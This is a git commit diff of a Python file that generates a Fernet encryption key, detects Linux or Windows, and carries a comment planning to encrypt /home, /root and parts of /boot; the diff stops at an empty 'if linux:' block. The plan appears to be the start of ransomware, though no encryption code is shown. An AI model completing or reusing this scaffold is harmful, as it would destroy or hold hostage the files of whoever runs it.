aedaabfac0606defeb2eff5620c74076142d3812
Toastrnet <becsmith@comcast.net>
2022-08-12 13:39:13 -0400

    added: encryption key generation OS detection

--- main.py
+++ main.py
@@ -1,3 +1,30 @@
-print("test")
-print("test2")
-print("test3")
+import platform
+from cryptography.fernet import Fernet
+import os
+
+
+# Generate the encryption key
+key = Fernet.generate_key()
+fernet = Fernet(key)
+
+# Check what OS is currently running
+system = platform.system() # Gets current OS
+linux = False
+windows = False
+
+# Changes bool variables to current system
+if system == "Linux":
+    linux = True
+    windows = False
+elif system == "Windows":
+    windows = True
+    linux = False
+else:
+    linux = False
+    windows = False
+
+
+# If Linux
+# Encrypt /home, /root, ceratin commands in /boot
+if linux:
+    
